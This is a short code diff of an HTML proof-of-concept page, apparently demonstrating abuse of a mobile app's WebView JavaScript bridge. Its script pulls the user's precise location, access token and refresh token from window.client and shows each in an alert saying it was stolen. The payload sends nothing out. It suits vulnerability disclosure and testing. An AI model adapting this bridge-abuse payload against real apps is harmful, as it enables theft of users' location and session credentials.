@@ -9,19 +9,14 @@
 <p id="content">attack ZTO </p>
 <script>
 starZTO();
-
  function starZTO() {
-     
-     
+   alert(window.client.getVersion());
    var stealAddr = window.client.getLocationAddress();
    alert('窃取到您的实时精确地址位置:'+ stealAddr);
-   
    var stealToken = window.client.getToken();
    alert('窃取到您的token:'+ stealToken);
-   
    var stealReToken = window.client.refreshToken();
-   alert('窃取到您的refresh token:'+ stealReToken);
-   
+   alert('窃取到您的refresh token:'+ stealReToken);  
  } 
 </script>
 </body>
